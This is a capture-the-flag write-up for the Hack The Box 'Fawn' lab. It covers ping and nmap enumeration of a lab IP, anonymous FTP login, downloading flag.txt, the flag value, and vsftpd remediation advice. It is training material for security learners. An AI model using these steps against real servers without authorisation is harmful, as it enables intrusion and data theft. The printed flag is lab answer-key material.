# HTB: Fawn — Writeup

**Difficulty:** Very Easy
**OS:** Linux
**Category:** FTP Misconfiguration

---

## Introduction

Sometimes, when enumerating the services of specific hosts on a client network, we encounter file transfer services that may have a high chance of being poorly configured. The purpose of this exercise is to familiarize ourselves with the File Transfer Protocol (FTP), a native protocol found on nearly all host operating systems and long used for simple file transfer tasks, whether automated or manual. FTP can be easily misconfigured if not correctly understood — an employee might try to bypass file checks or firewall rules to move a file to a peer, and the many mechanisms used to control and monitor data flow on an enterprise network today make this a realistic scenario to encounter in the wild.

FTP can also be used to transfer log files between network devices or to a central log collection server. If the engineer responsible for that configuration forgets to secure the receiving FTP server, or underestimates the sensitivity of the logs, an attacker can gain leverage from those logs — extracting information to map the network, enumerate usernames, detect active services, and more.

---

## Enumeration

### 1. Confirm connectivity

Before scanning, it's good practice to confirm the VPN connection is up and the target is reachable. `ping` is a low-overhead way to do this — it sends very little data, so you get a quick answer without waiting on a full scan.

```
ping {target_IP}
```

![Ping the target](images/pingIP.png)

> Note: this won't always work on a real corporate network, since firewalls commonly block ICMP between hosts (even within the same LAN) to reduce insider-threat exposure and host/service discovery.

**Target IP** (from the HTB lab panel):

![Target IP](images/Target_IP.png)

### 2. Port scan with Nmap

A default Nmap scan shows a single open port:

```
sudo nmap 10.129.1.14
```

Followed by a version scan to identify what's running on it:

```
sudo nmap -sV 10.129.1.14
```

![Nmap scan results](images/Nmap.png)

**Results:**

| Port | State | Service | Version |
|------|-------|---------|---------|
| 21/tcp | open | ftp | vsftpd 3.0.3 |

Only FTP is exposed, running **vsftpd 3.0.3** on Unix.

---

## Foothold

Now it's time to interact with the target. To access the FTP service we use the `ftp` command from our own host. It's worth double-checking that `ftp` is installed and up to date first:

```
sudo apt install ftp -y
```

![Confirming ftp is installed](images/FTP.png)

### Connecting

```
ftp 10.129.1.14
```

When prompted for a username, we try `anonymous` — a legacy FTP account that, when enabled, allows access without a real credential (often with just an email address or blank as the "password"). This is exactly the kind of misconfiguration the intro talked about.

```
Name (10.129.1.14:kali): anonymous
331 Please specify the password.
Password:
230 Login successful.
```

Login succeeds — anonymous access is enabled.

### Locating and retrieving the flag

Listing the directory shows a single file:

```
ftp> ls
-rw-r--r--    1 0        0              32 Jun 04 2021 flag.txt
```

Download it:

```
ftp> get flag.txt
```

![FTP session — anonymous login and flag.txt retrieval](images/Screenshot_2026-07-25_121505.png)

---

## Obtaining the Flag

After exiting the FTP session (`bye`), the file has been pulled down to the local working directory:

```
ftp> bye
221 Goodbye.

ls
```

`flag.txt` now sits alongside the rest of the home directory contents. Reading it out:

```
cat flag.txt
```

![Reading the retrieved flag](images/Obtain_Flag.png)

**Flag:**
```
035db21c881520061c53e0536e44f815
```

---

## Summary

| Step | Action | Finding |
|------|--------|---------|
| 1 | `ping` | Host reachable, VPN confirmed |
| 2 | `nmap -sV` | Port 21/tcp open — vsftpd 3.0.3 |
| 3 | `ftp` + `anonymous` login | Anonymous FTP access allowed (no credentials required) |
| 4 | `ls` / `get flag.txt` | Retrieved `flag.txt` from the FTP root |
| 5 | `cat flag.txt` | Flag obtained |

**Root cause:** The FTP service was configured to allow anonymous authentication with read access to sensitive files. This is a classic and common misconfiguration — FTP servers should disable anonymous login unless there's a specific, intentional business need (e.g. a public file drop), and even then, sensitive files should never be placed in a directory reachable by unauthenticated users.

**Remediation:**
- Disable anonymous FTP login (`anonymous_enable=NO` in `vsftpd.conf`)
- Enforce authenticated access with least-privilege file permissions
- Avoid storing sensitive files (credentials, logs, flags/secrets) in publicly accessible service directories
- Consider replacing FTP with SFTP/FTPS where encryption and stronger auth are required
